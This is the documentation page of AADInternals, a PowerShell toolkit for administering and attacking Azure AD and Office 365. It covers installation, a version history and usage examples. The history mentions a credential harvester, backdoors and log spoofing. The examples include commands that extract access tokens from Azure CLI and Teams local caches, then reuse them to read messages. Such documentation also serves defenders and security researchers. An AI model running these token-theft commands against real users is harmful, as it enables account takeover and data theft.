+++
title = "AAD Internals"
date = "2018-10-25"
lastmod = "2022-10-01"
menu = "main"
tags = ["Office365","PowerShell","AADInternals","AzureAD"]
categories = ["article"]
description = "AAD Internals PowerShell module"
+++


 <!--more-->

# Introduction

**AADInternals** toolkit is a PowerShell module containing tools for administering and hacking Azure AD and Office 365. It is listed in MITRE ATT&CK with id <a href="https://attack.mitre.org/software/S0677/" target="_blank">S0677</a>.

## Installation

The module can be installed from PowerShell:
{{< highlight powershell >}}
# Install the module
Install-Module AADInternals

# Import the module
Import-Module AADInternals
{{< /highlight>}}

Output:
```
    ___    ___    ____  ____      __                        __    
   /   |  /   |  / __ \/  _/___  / /____  _________  ____ _/ /____
  / /| | / /| | / / / // // __ \/ __/ _ \/ ___/ __ \/ __ '/ / ___/
 / ___ |/ ___ |/ /_/ _/ // / / / /_/  __/ /  / / / / /_/ / (__  ) 
/_/  |_/_/  |_/_____/___/_/ /_/\__/\___/_/  /_/ /_/\__,_/_/____/  
  
 v0.7.3 by @DrAzureAD (Nestori Syynimaa)

```

The module is also available in GitHub https://github.com/Gerenios/AADInternals and <a href="https://www.powershellgallery.com/packages/AADInternals/" target="_blank">PowerShell Gallery</a>.

## About

**AAD Internals** is a PowerShell module where I've tried to put all the knowledge I've gained during the years spent with Office 365 and Azure AD.
It is a result of hours of reverse-engineering and debugging of Microsoft tools related to Azure AD, such as PowerShell modules,
directory synchronisation, and admin portals.

The module is a **plain PowerShell script module**, so you can copy and paste the code to your own scripts as needed. Having said that,
the are some functions that are utilising the built-in functionality of Windows. Thus, everything might not work on every computer.

The module is now on beta, so all comments and ideas are more than welcome. You can comment to this article or post 
bugs and fixes to GitHub. 

I haven't tried to duplicate all functionality MSOnline or AzureAD modules currently have. 
Instead, I decided to bring that information and functionality those modules doesn't provide. Also, I have created some "blackhat" level
functionality that allows administrators to do things that shouldn't be even possible..

Detailed help about parameters etc. can be seen using PowerShell Get-Help cmdlet:
{{< highlight powershell >}}
# See help for Get-AADIntAccessTokenForAADGraph
Get-Help Get-AADIntAccessTokenForAADGraph
{{< /highlight>}}
 
## Version info

Version | Date | Version notes
---     | ---  | ---
0.7.3 | Oct  1st 2022 | Fixed <a href="#set-aadintspositemembers-s">Set&#8209;AADIntSPOSiteMembers</a> merge issues.
0.7.2 | Oct  1st 2022 | Added <a href="#export-aadintazureclitokens">Export&#8209;AADIntAzureCliTokens</a> and <a href="#export-aadintteamstokens">Export&#8209;AADIntTeamsTokens</a>. <br> Added <a href="#get-aadinttenantdomain-m">Get&#8209;AADIntTenantDomain</a> to get domain name using tenant id. <br> Added -GetRelayingParties switch to <a href="#invoke-aadintreconasoutsider">Invoke&#8209;AADIntReconAsOutsider</a> to extract Relaying Trust parties from the AD FS server. <br> Added <a href="#set-aadintspositemembers-s">Set&#8209;AADIntSPOSiteMembers</a>.
0.7.1 | Sep 16th 2022 | More bug fixes.
0.7.0 | Sep 9th  2022 | Bug fixes.
0.6.9 | Sep 8th  2022 | Added functionality to add tokens to cache, added gMSA support and account lookup to <a href="#get-aadintlsasecrets">Get&#8209;AADIntLSASecrets</a>. <br> Updated <a href="#export-aadintadfscertificates">Export&#8209;AADIntADFSCertificates</a>: Exports also custom certificates (not stored in config db). "Local export" now uses a service running as AD FS service account to fetch DKM decryption key from AD.<br>Added proof-of-concept <a href="#certificate-based-authentication-cba">CBA functionality</a>. <br> Added CBA information to <a href="#invoke-aadintreconasoutsider">Invoke&#8209;AADIntReconAsOutsider</a>. <br> Added <a href="#export-aadintproxyagentcertificates">Export&#8209;AADIntProxyAgentCertificates</a> to export PTA & provisioning agent certificates. Fixed <a href="#set-aadintptacertificate">Set&#8209;AADIntPTACertificate</a>.<br>Exposed <a href="#get-aadintaccesstoken">Get-AADIntAccessToken</a> and <a href="#get-aadintaccesstokenwithrefreshtoken">Get&#8209;AADIntAccessTokenWithRefreshToken</a> 😱 <br> Added -UpdateTrust option to <a href="#register-aadintptaagent-p">Register-AADIntPTAAgent</a> and <a href="#register-aadintsyncagent-p">Register&#8209;AADIntSyncAgent</a> for renewing certificates. Added functionality to add tokens to cache, added gMSA support and account lookup to <a href="#get-aadintlsasecrets">Get&#8209;AADIntLSASecrets</a>. <br> Updated <a href="#export-aadintadfscertificates">Export&#8209;AADIntADFSCertificates</a>: Exports also custom certificates (not stored in config db). "Local export" now uses a service running as AD FS service account to fetch DKM decryption key from AD.<br>Added proof-of-concept <a href="#certificate-based-authentication-cba">CBA functionality</a>. <br> Added CBA information to <a href="#invoke-aadintreconasoutsider">Invoke&#8209;AADIntReconAsOutsider</a>. <br> Added <a href="#export-aadintproxyagentcertificates">Export&#8209;AADIntProxyAgentCertificates</a> to export PTA & provisioning agent certificates. Fixed <a href="#set-aadintptacertificate">Set&#8209;AADIntPTACertificate</a>.<br>Exposed <a href="#get-aadintaccesstoken">Get-AADIntAccessToken</a> and <a href="#get-aadintaccesstokenwithrefreshtoken">Get&#8209;AADIntAccessTokenWithRefreshToken</a> 😱 <br> Added -UpdateTrust option to <a href="#register-aadintptaagent-p">Register-AADIntPTAAgent</a> and <a href="#register-aadintsyncagent-p">Register&#8209;AADIntSyncAgent</a> for renewing certificates. 
0.6.8 | Jun 3rd  2022 | Added functionality to unprotect <a href="#unprotect-aadintestsauthpersistentcookie">ESTSAUTHPERSISTENT</a> cookie.
0.6.7 | Jun 3rd  2022 | Added functionality to <a href="#get-aadintsyncfeatures-a">list</a> and <a href="#set-aadintsyncfeatures-a">modify</a> sync features. <br> Removed Get-PassThroughAuthenticationStatus and Invoke-AADIntPTAAgent. <br> Added: <a href="#find-aadintteamsexternaluser-t">Find-AADIntTeamsExternalUser</a> for getting user's Teams information (including Azure AD object id), <a href="#get-aadintteamsavailability-t">Get-TeamsAvailability</a> for getting user's Teams availability information, <a href="#get-aadinttranslation-t">Get-AADIntTranslation</a> for translating any text to specified language, <a href="#get-aadinttenantorganisationinformation-ad">Get-AADIntTeanantOrganisationInformation</a> for getting tenant information using tenantid (includes tenant name), and <a href="#start-aadintspeech-on">Start-AADIntSpeech</a> for speaking out the given text.
0.6.6 | Feb 15th 2022 | Added functionality to export the <a href="#export-aadintlocaldevicecertificate">device certificate</a> and <a href="#export-aadintlocaldevicetransportkey">transport keys</a> of Azure AD Joined and Registered devices. <br> Added functionality to configure (i.e. "<a href="#join-aadintlocaldevicetoazuread">join</a>") Windows devices using AADInternals generated or exported certificates. Added functionality to set <a href="#set-aadintproxysettings">proxy</a> settings to help MITM. <br>Added <a href="#find-aadintmspartners">Find-AADIntMSPartner</a>.
0.6.5 | Dec 13th 2021 | Added MSPartner <a href="#ms-partner-functions" target="_blank">functionality</a> & included in Invoke-AADIntReconAsInsider. <br>Added functions for creating and decoding AD FS refresh tokens.<br> Added some utilities + bug fixes.
0.6.4 | Sep 21st 2021 | "<a href="https://online.commsverse.com" target="_blank">Commsverse</a> edition". Bug fix for loading System.Xml.XmlDictionary.
0.6.3 | Sep 15th 2021 | "<a href="https://online.commsverse.com" target="_blank">Commsverse</a> edition". Minor bug fixes for Teams and access token functions.
0.6.2 | Sep  1st 2021 | Added <a href="#search-aadintunifiedauditlog-ca">Search-AADIntUnifiedAuditLog</a> function! <br> Added <a href="#set-aadintselfservicepurchaseproduct-cm">Set-AADIntSelfServicePurchaseProduct</a> for enabling and disabling self-service product purchases. <br> Updated <a href="#register-aadintmfaapp-my">Register-AADIntMFAApp</a> to support OTP registration. <br> Added <a href="#open-aadintowa-o">Open-AADIntOWA</a> for opening OWA using provided access token.
0.6.1 | Aug 26th 2021 | "<a href="https://helsec.fi/" target="_blank">HelSec</a> edition". Bug fix to <a href="#get-aadintazuredirectoryactivitylog-ac">Get-AADIntAzureDirectoryActivityLog</a> function.
0.6.0 | Aug 26th 2021 | "<a href="https://helsec.fi/" target="_blank">HelSec</a> edition". Decreased the module loading time by using .psd1 and .psm1 in a way they were meant to. <br>Added <a href="#get-aadintazuredirectoryactivitylog-ac">Get-AADIntAzureDirectoryActivityLog</a> function.
0.5.0 | Aug 23rd 2021 | Added <a href="#hybrid-health-functions">hybrid health</a> functionality allowing spoofing Azure AD sign-ins log. <br>Fixed a bug getting access tokens with kerberos tickets. <br>Yet another new enumeration method for <a href="#invoke-aadintuserenumerationasoutsider" target="_blank">Invoke-AADIntUserEnumerationAsOutsider</a>!
0.4.9 | Jun 30th 2021 | Updated <a href="#invoke-aadintuserenumerationasoutsider" target="_blank">Invoke-AADIntUserEnumerationAsOutsider</a> (new enumeration method) and <a href="#get-aadintsynccredentials" target="_blank">Get-AADIntSyncCredentials</a> (support for multiple forests). Bug fixes for MFA apps, Azure AD Join and OneDrive.
0.4.8 | May 11th 2021 | "<a href="https://www.teamsnation.online/" target="_blank">Teams Nation</a> edition". Fixed Send-AADIntTeamsMessage. Added AD FS policy store rule modification functionality.
0.4.7 | Apr 27th 2021 | Refactored Kerberos and AD FS certificate export functionality. Added remote AD FS configuration export. Added some DRS functionality from DSInternals.
0.4.6 | Mar 3rd  2021 | Added Azure AD register and Hybrid Join by federation functionality and some smaller improvements. Fixed access token for MySigns. Updated AD FS certificate export function.<br>PRT can now be fetched with cached refresh token instead of credentials.<br>Updated SAML token signatures to SHA256.
0.4.5 | Jan 31st 2021 | Added BPRT (bulk PRT) and Hybrid Join functionality. Added functionality for handing Rollout Policies, Azure Diagnostic Settings, and Unified Audit Log Settings.
0.4.4 | Oct 18th 2020 | "<a href="https://www.identitysummit.cloud/" target="_blank">Cloud Identity Summit 2020</a> edition". Added device code authentication support access token functions (-UseDeviceCode). <br> Added phishing functionality. <br> Added -GetNonce switch for New-AADIntUserPRTToken. <br> Added Teams functionality.
0.4.3 | Sep 29th 2020 | Added Azure Cloud Shell functionality + updates to PRT/MDM.
0.4.2 | Sep 9th  2020 | Added MDM functionality.
0.4.1 | Sep 1st  2020 | Added functionality for joining "devices" to Azure AD and Intune MDM. Added PRT functionality. Some bug fixes.
0.4.0 | Aug 6th  2020 | Updated the Access Token cache behaviour. Now, when saved to cache, access token gets updated automatically if expired. <br>Added functionality for getting Azure AD tenant information and enumerating users as a an outsider, guest, and insider user.
0.3.3 | Jun 3rd  2020 | Added functionality for elevating Global Admin to Azure User Access Administrator and functions for accessing some Azure workloads 😁
0.3.2 | May 28th 2020 | "psconf.eu edition". Bug fixes and some minor feature updates to existing functions.
0.3.1 | May 17th 2020 | Added functionality for registering Sync agents (Azure AD Connect cloud provisioning) and listing agent information. Fixed exporting Azure AD Connect credentials and added many AD related Mimikatz-like functions.
0.2.8 | Mar 30th 2020 | Added functionality for registering PTA Agents and configuring users' MFA settings. Includes an experimental PTA Agent that emulates Azure AD pass-through authentication.
0.2.7 | Dec 12th 2019 | "Black Hat Europe edition". <br>Added OneDrive for Business functions. Allows bypassing OneDrive (and SharePoint & Teams) domain restrictions.
0.2.6 | Oct 30th 2019 | "T2 infosec edition". <br>Added Kerberos support. Allows getting Access Tokens using Kerberos tickets, and using Seamless Single-Sign-On as backdoor. 
0.2.5 | Aug 16th 2019 | ADFS certificate export finally working! Bug fixes.
0.2.4 | Aug 2nd  2019 | "Black Hat edition". <br>Added client, SPO, and SARA functions, several bug fixes.
0.2.3 | May 29th 2019 | Added functions to manipulate ADFS token signing certificates.
0.2.2 | May 22nd 2019 | Added PTASpy (pass-through authentication credential harvester and backdoor).
0.1.8 | May 17th 2019 | Added functions to extract and reset Azure AD Connect credentials.
0.1.7 | May 10th 2019 | Added Exchange Online and Outlook functionality + loads of other updates.
0.1.1 | Oct 25th 2018 | The first beta release. 


# Functionality

## Playing with access tokens

### Get-AADIntAccessTokenFor&lt;Service>

Most of the functions are using REST APIs which require OAuth access tokens. The AADInternals module is using the following types of access tokens. Since version 0.4.0, all tokens are cached if
**-SaveToCache** switch is used. If expired, cached tokens are automatically renewed with the corresponding refresh token.

Token/API | Function | Remarks
--- | --- | --- 
AAD Graph 					   | Get-AADIntAccessTokenForAADGraph 	        | Functions using AAD Graph access token.
MS Graph 					   | Get-AADIntAccessTokenForMSGraph	        | Functions using MS Graph access token.
Pass Through Authentication	   | Get-AADIntAccessTokenForPTA		        | Used when enabling/disabling PTA and Seamless SSO (Desktop SSO)
Azure Admin Portal			   | Get-AADIntAccessTokenForAADIAMAPI	        | Used when inviting guest users. 
Exchange Online 			   | Get-AADIntAccessTokenForEXO                | Used with Exchange Online and ActiveSync functions
Support and Recovery Assistant | Get-AADIntAccessTokenForSARA               | Used with Support and Recovery Assistant functions
SharePoint Online 			   | Get-AADIntSPOAuthenticationHeader          | Used with SharePoint Online functions
OneDrive for Business          | New-AADIntOneDriveSettings                 | Used with OneDrive for Business functions
Azure Core Management          | Get-AADIntAccessTokenForAzureCoreManagemnt | Used with Azure Core Management functions
Azure AD Join                  | Get-AADIntAccessTokenForAADJoin            | Used with Azure AD join function
Azure Intune MD                | Get-AADIntAccessTokenForIntuneMDM          | Used with Intune MDM functions
Azure Cloud Shell              | Get-AADIntAccessTokenForCloudShell         | Used with Azure Cloud Shell

To get an AAD Graph access token and save it to cache, run the following function. The token will be valid for an hour, after that, a new access token is fetched using the refresh token.
{{< highlight powershell >}}
# Prompt for credentials and retrieve & store access token to cache
Get-AADIntAccessTokenForAADGraph -SaveToCache
{{< /highlight>}}

To see the cached credentials:
{{< highlight powershell >}}
# Show the cached credentials
Get-AADIntCache
{{< /highlight>}}
Output:
```
Name            : admin@company.com
ClientId        : d3590ed6-52b3-4102-aeff-aad2292ab01c
Audience        : https://management.core.windows.net
Tenant          : 2b55c1c4-ba18-46d0-9a7a-7a75b9493dbd
IsExpired       : False
HasRefreshToken : True

Name            : admin@company.com
ClientId        : 1b730954-1685-4b74-9bfd-dac224a7b894
Audience        : https://graph.windows.net
Tenant          : 2b55c1c4-ba18-46d0-9a7a-7a75b9493dbd
IsExpired       : False
HasRefreshToken : True
```

### Get-AADIntAccessToken
This is an internal utility function used by all **Get-AADIntAccessTokenFor&lt;service>** functions. Exposed in version **0.6.9**.

Gets OAuth Access Token for the given client and resource. Using the given authentication method. If not provided, uses interactive logon.

**Example 1:** 
{{< highlight powershell >}}
# Get access token for MS Graph API for "Microsoft Office" client using interactive login
$at=Get-AADIntAccessToken -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -Resource "https://graph.microsoft.com" 
{{< /highlight>}}

**Example 2:** 
{{< highlight powershell >}}
# Get access token and refresh token for MS Graph API for "Microsoft Office" client using interactive login and save to cache
$at=Get-AADIntAccessToken -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -Resource "https://graph.microsoft.com" 
{{< /highlight>}}
**Output:**
```
AccessToken saved to cache.

Tenant   : 9779e97e-de19-45be-87ab-a7ed3e86fa62
User     : user@company.com
Resource : https://graph.microsoft.com
Client   : d3590ed6-52b3-4102-aeff-aad2292ab01c
```

### Get-AADIntAccessTokenWithRefreshToken
This is an internal utility function used to renew access tokens. Exposed in version **0.6.9**.

Gets OAuth Access Token for the given client and resource using the given refresh token.
For FOCI refresh tokens, i.e.,Family Refresh Tokens (FRTs), you can use any FOCI client id.

**Example:** 
{{< highlight powershell >}}
# Get access token and refresh token for MS Graph API for "Microsoft Office" client using interactive login
$tokens=Get-AADIntAccessToken -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -Resource "https://graph.microsoft.com" -IncludeRefreshToken $true

# Get access token for AAD Graph API for "Teams" client.
$at=Get-AADIntAccessTokenWithRefreshToken -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -Resource "https://graph.windows.net" -TenantId "contoso.azurelabs.online" -RefreshToken $tokens[1] 

# Dump the token
Read-AADIntAccesstoken $at
{{< /highlight>}}

**Output:**
```
aud                 : https://graph.windows.net
iss                 : https://sts.windows.net/9779e97e-de19-45be-87ab-a7ed3e86fa62/
iat                 : 1662455333
nbf                 : 1662455333
exp                 : 1662460717
acr                 : 1
aio                 : ATQAy/8TAAAAeOTMVmaomZFyHLApXlzZNnWkLLuRB/9yBsfn0Qp7GzMtntUBwQN6byqsy9RwHUK8
amr                 : {pwd}
appid               : 1fec8e78-bce4-4aaf-ab1b-5451cc387264
appidacr            : 0
family_name         : User
given_name          : Sample
ipaddr              : 1.143.35.120
name                : Sample User
oid                 : 47bd560e-fd5e-42c5-b51b-ce963892805f
onprem_sid          : S-1-5-21-2918793985-2280761178-2512057791-1151
puid                : 10032[redacted]
rh                  : 0.AXkAnZT_xZYmaEueEwVfGe0tUQIAAAAAAAAAwAAAAAAAAAB5AOw.
scp                 : UserProfile.Read
sub                 : DWAJiCPnQQkiJP_qBKOf9MX4p0YqJ5Yd0aUyovzlRR0
tenant_region_scope : EU
tid                 : 9779e97e-de19-45be-87ab-a7ed3e86fa62
unique_name         : user@company.com
upn                 : user@company.com
uti                 : 78SP1JP-wEWN5AgCCcDWAA
ver                 : 1.0
```

### Export-AADIntAzureCliTokens
Since version 0.7.2

Exports Azure CLI access tokens from the msal_token_cache.bin cache. 
On Windows, msal_token_cache.bin is a json file protected with DPAPI in LocalUser context.

**Example 1:** 
{{< highlight powershell >}}
# Export Azure CLI tokens
Export-AADIntAzureCliTokens
{{< /highlight>}}

**Output 1:**
```
Users: user@company.com,user2@company.com

UserName          access_token                                                                  
--------          ------------                                                                  
user@company.com  eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx...
user@company.com  eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx...
user2@company.com eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx...
user2@company.com eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx...
```
**Example 2:** 
{{< highlight powershell >}}
# Export Azure CLI tokens, add them to cache and copy to clipboard
Export-AADIntAzureCliTokens -AddToCache -CopyToClipboard
{{< /highlight>}}

**Output 2:**
```
Users: user@company.com,user2@company.com

4 access tokens added to cache
4 access tokens copied to clipboard
```

### Export-AADIntTeamsTokens
Since version 0.7.2

Exports Teams tokens from the provided Cookie database, or from current user's local database.
The Teams Cookies database is SQLite database.

**Example 1:** 
{{< highlight powershell >}}
# Export Teams tokens
Export-AADIntTeamsTokens
{{< /highlight>}}

**Output 1:**
```
Name                           Value                                                     
----                           -----                                                     
office_access_token            eyJ0eXAiOiJKV1QiLCJub25jZSI6InlsUjJWRmp4SWFqeVVqeklZa3R...
skypetoken_asm                 eyJhbGciOiJSUzI1NiIsImtpZCI6IjEwNiIsIng1dCI6Im9QMWFxQnl...
authtoken                      eyJ0eXAiOiJKV1QiLCJub25jZSI6InpsUFY2bnRCUDR5NTFLTkNQR2l...
SSOAUTHCOOKIE                  eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik5sbHJiaFlzYl9rVnU3VzVSa01...
```
**Example 2:** 
{{< highlight powershell >}}
# Export Teams tokens from the given file
Export-AADIntTeamsTokens -CookieDatabase C:\Cookies 
{{< /highlight>}}

**Output 2:**
```
User: user@company.com

Name                           Value                                                     
----                           -----                                                     
office_access_token            eyJ0eXAiOiJKV1QiLCJub25jZSI6InlsUjJWRmp4SWFqeVVqeklZa3R...
skypetoken_asm                 eyJhbGciOiJSUzI1NiIsImtpZCI6IjEwNiIsIng1dCI6Im9QMWFxQnl...
authtoken                      eyJ0eXAiOiJKV1QiLCJub25jZSI6InpsUFY2bnRCUDR5NTFLTkNQR2l...
SSOAUTHCOOKIE                  eyJ0eXAiOiJKV1QiLCJub25jZSI6Ik5sbHJiaFlzYl9rVnU3VzVSa01...
```

**Example 2:** 
{{< highlight powershell >}}
# Add Teams tokens to AADInt token cache
Export-AADIntTeamsTokens -AddToCache

# Get Teams messages
Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName
{{< /highlight>}}

**Output 2:**
```
User: user@company.com

3 access tokens added to cache

Id            Content                         DeletionTime  MessageType   Type          DisplayName 
--            -------                         ------------  -----------   ----          ----------- 
1602842299338                                 1602846853687 RichText/Html MessageUpdate Bad User
1602844861358                                 1602858789696 RichText/Html MessageUpdate Bad User
1602846167606                                 1602858792943 Text          MessageUpdate Bad User
1602846853687                                 1602858795517 Text          MessageUpdate Bad User
1602833251951                                 1602833251951 Text          MessageUpdate Bad User
1602833198442                                 1602833198442 Text          MessageUpdate Bad User
1602859223294 Hola User!                                    Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          MessageUpdate Bad User
1602859473083 <div><div>Hi User!</div></div>                RichText/Html NewMessage    Bad User
1602859484420 Hey User!                                     Text          NewMessage    Bad User
1602859528028 Hy User!                                      Text          NewMessage    Bad User
1602859484420 Hey User!                                     Text          MessageUpdate Bad User
1602859590916 Hi User!                                      Text          NewMessage    Bad User
```

### Token cache
To delete the cache:
{{< highlight powershell >}}
# Clear credentials cache
Clear-AADIntCache
{{< /highlight>}}

To add tokens to cache (refresh token optional):
{{< highlight powershell >}}
# Add access token to cache
Add-AADIntAccessTokenToCache -AccessToken "eyJ0eXAiOiJKV..." -RefreshToken "0.AXkAnZT_xZYmaEueEwVfGe..."
{{< /highlight>}}
```
Name             ClientId                             Audience                             Tenant                               IsExpired HasRefreshToken
----              --------                             --------                             ------                               --------- ---------------
admin@company.com 1b730954-1685-4b74-9bfd-dac224a7b894 https://graph.windows.net            82205ae4-4c4e-4db5-890c-cb5e5a98d7a3     False            True
```

## Tenant information and manipulation functions

**Information functions** are functions that can be used to retrieve information about users, tenants, and Office 365. Functions marked with * doesn't need authentication. 
Functions marked with A uses AAD Graph access token.

### Get-AADIntLoginInformation (*)
This function returns login information for the given user (or domain). 

**Example:**
{{< highlight powershell >}}
# Get login information for a domain
Get-AADIntLoginInformation -Domain company.com
{{< /highlight>}}

**Output:**
```
Federation Protocol                  : WSTrust
Pref Credential                      : 4
Consumer Domain                      : 
Cloud Instance audience urn          : urn:federation:MicrosoftOnline
Authentication Url                   : https://msft.sts.microsoft.com/adfs/ls/?username=nn%40microsoft.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=
Throttle Status                      : 1
Account Type                         : Federated
Has Password                         : True
Federation Active Authentication Url : https://msft.sts.microsoft.com/adfs/services/trust/2005/usernamemixed
Exists                               : 0
Federation Metadata Url              : https://msft.sts.microsoft.com/adfs/services/trust/mex
Desktop Sso Enabled                  : 
Tenant Banner Logo                   : 
Tenant Locale                        : 
Cloud Instance                       : microsoftonline.com
State                                : 3
Domain Type                          : 4
Domain Name                          : microsoft.com
Tenant Banner Illustration           : 
Federation Brand Name                : Microsoft
Federation Global Version            : -1
User State                           : 2
```

### Get-AADIntEndpointInstances (*)
This function returns Office 365 instances and information when the latest changes have been made (e.g. ips & urls).

**Example:**
{{< highlight powershell >}}
# Get Office 365 instances
Get-AADIntEndpointInstances 
{{< /highlight>}}

**Output:**
```
instance     latest    
--------     ------    
Worldwide    2018100100
USGovDoD     2018100100
USGovGCCHigh 2018100100
China        2018100100
Germany      2018100100
```

### Get-AADIntEndpointIps (*)
This function returns Office 365 ip addresses and urls for the given instance. The information can be used to create firewall rules.

**Example:**
{{< highlight powershell >}}
# Get ips and urls for "normal" Office 365
Get-AADIntEndpointIps -Instance WorldWide
{{< /highlight>}}

**Output:**
```
id                     : 1
serviceArea            : Exchange
serviceAreaDisplayName : Exchange Online
urls                   : {outlook.office.com, outlook.office365.com}
ips                    : {13.107.6.152/31, 13.107.9.152/31, 13.107.18.10/31, 13.107.19.10/31...}
tcpPorts               : 80,443
expressRoute           : True
category               : Optimize
required               : True

id                     : 2
serviceArea            : Exchange
serviceAreaDisplayName : Exchange Online
urls                   : {smtp.office365.com}
ips                    : {13.107.6.152/31, 13.107.9.152/31, 13.107.18.10/31, 13.107.19.10/31...}
tcpPorts               : 587
expressRoute           : True
category               : Allow
required               : True
```

### Get-AADIntTenantDetails (A)
This function returns details for the given tenant.

**Example:**
{{< highlight powershell >}}
# Get tenant details
Get-AADIntTenantDetails
{{< /highlight>}}

**Output:**
```
odata.type                           : Microsoft.DirectoryServices.TenantDetail
objectType                           : Company
objectId                             : e21e0e8c-d2ed-4edf-aa91-937963949cdc
deletionTimestamp                    : 
assignedPlans                        : ..
city                                 : 
companyLastDirSyncTime               : 2018-10-25T12:53:43Z
country                              : 
countryLetterCode                    : FI
dirSyncEnabled                       : True
displayName                          : Company Ltd
marketingNotificationEmails          : {}
postalCode                           : 
preferredLanguage                    : en
privacyProfile                       : 
provisionedPlans                     : ..
provisioningErrors                   : {}
securityComplianceNotificationMails  : {}
securityComplianceNotificationPhones : {}
state                                : 
street                               : 
technicalNotificationMails           : {user@alt.none}
telephoneNumber                      : 123456789
verifiedDomains                      : ..
```

### Get-AADIntTenantID (*)
Since version 0.1.6 <br>
This function returns tenant id for the given user, domain, or Access Token.

**Example:**
{{< highlight powershell >}}
# Get tenant ID
Get-AADIntTenantID -Domain microsoft.com
{{< /highlight>}}

**Output:**
```
72f988bf-86f1-41af-91ab-2d7cd011db47
```

### Get-AADIntOpenIDConfiguration (*)
Since version 0.1.6 <br>
This function returns the open ID configuration for the given user or domain.

**Example:**
{{< highlight powershell >}}
# Get tenant ID
Get-AADIntOpenIDConfiguration -Domain microsoft.com
{{< /highlight>}}

**Output:**
```
authorization_endpoint                : https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/oauth2/authorize
token_endpoint                        : https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/oauth2/token
token_endpoint_auth_methods_supported : {client_secret_post, private_key_jwt, client_secret_basic}
jwks_uri                              : https://login.microsoftonline.com/common/discovery/keys
response_modes_supported              : {query, fragment, form_post}
subject_types_supported               : {pairwise}
id_token_signing_alg_values_supported : {RS256}
http_logout_supported                 : True
frontchannel_logout_supported         : True
end_session_endpoint                  : https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/oauth2/logout
response_types_supported              : {code, id_token, code id_token, token id_token...}
scopes_supported                      : {openid}
issuer                                : https://sts.windows.net/72f988bf-86f1-41af-91ab-2d7cd011db47/
claims_supported                      : {sub, iss, cloud_instance_name, cloud_instance_host_name...}
microsoft_multi_refresh_token         : True
check_session_iframe                  : https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/oauth2/checksession
userinfo_endpoint                     : https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/openid/userinfo
tenant_region_scope                   : WW
cloud_instance_name                   : microsoftonline.com
cloud_graph_host_name                 : graph.windows.net
msgraph_host                          : graph.microsoft.com
rbac_url                              : https://pas.windows.net
```

### Get-AADIntServiceLocations (A)
This function shows the tenant's true service locations. 

**Example:**
{{< highlight powershell >}}
# Get service location information of the tenant
Get-AADIntServiceLocations | Format-Table
{{< /highlight>}}

**Output:**
```
Region Instance             Name                          State Country
------ --------             ----                          ----- -------
EU     EU001                PowerBI                             IR     
EU     PROD_MSUB01_02       SCO                                 IE     
NA     NA001                MultiFactorService                  US     
NA     NA001                AzureAdvancedThreatAnalytics        US     
EU     Prod04               Adallom                             GB     
NA     NA001                AADPremiumService                   US     
EU     EURP191-001-01       exchange                            IE     
NA     NA003                YammerEnterprise                    US     
NA     NA001                To-Do                               US     
NA     NA001                TeamspaceAPI                        US     
NA     NA001                Sway                                US     
EU     SPOS1196             SharePoint                          NL     
EU     EU                   RMSOnline                           NL     
EU     PROD_EU_Org_Ring_152 ProjectWorkManagement               NL     
NA     NA001                ProcessSimple                       US     
NA     NA001                PowerAppsService                    US     
NA     NA001                OfficeForms                         US     
NA     NA001                MicrosoftStream                     US     
NA     NorthAmerica1        MicrosoftOffice                     US     
EU     EMEA-2E-S3           MicrosoftCommunicationsOnline       NL     
EU     emea05-01            ExchangeOnlineProtection            NL     
NA     NA001                Deskless                            US     
NA     NA002                SMIT                                US     
NA     NA001                Metro                               US     
EU     EU003                DirectoryToCosmos                   GB     
NA     *                    BecWSClients                        US     
NA     NA033                BDM                                 US     
EU     EUGB02               AadAllTenantsNotifications          GB
```

### Get-AADIntServicePlans (A)
This function returns information about tenant's service plans, such as name, id, status, and when first assigned.

**Example:**
{{< highlight powershell >}}
# Get the service plans of the tenant
Get-AADIntServicePlans | Format-Table
{{< /highlight>}}

**Output:**
```
SKU               ServicePlanId                        ServiceName           ServiceType                   AssignedTimestamp    CapabilityStatus ProvisioningStatus
---               -------------                        -----------           -----------                   -----------------    ---------------- ------------------
ENTERPRISEPREMIUM b1188c4c-1b36-4018-b48b-ee07604f6feb PAM_ENTERPRISE        Exchange                      2018-09-27T15:47:45Z Enabled          Success           
                  76846ad7-7776-4c40-a281-a386362dd1b9                       ProcessSimple                 2018-09-27T15:47:25Z Deleted                            
                  c87f142c-d1e9-4363-8630-aaea9c4d9ae5                       To-Do                         2018-09-27T15:47:24Z Deleted                            
                  c68f8d98-5534-41c8-bf36-22fa496fa792                       PowerAppsService              2018-09-27T15:47:25Z Deleted                            
                  9e700747-8b1d-45e5-ab8d-ef187ceec156                       MicrosoftStream               2018-09-27T15:47:25Z Deleted                            
                  2789c901-c14e-48ab-a76a-be334d9d793a                       OfficeForms                   2018-09-27T15:47:25Z Deleted                            
ENTERPRISEPREMIUM 9f431833-0334-42de-a7dc-70aa40db46db LOCKBOX_ENTERPRISE    Exchange                      2018-08-27T05:46:50Z Enabled          Success           
ENTERPRISEPREMIUM 3fb82609-8c27-4f7b-bd51-30634711ee67 BPOS_S_TODO_3         To-Do                         2018-08-27T05:46:50Z Enabled          Success           
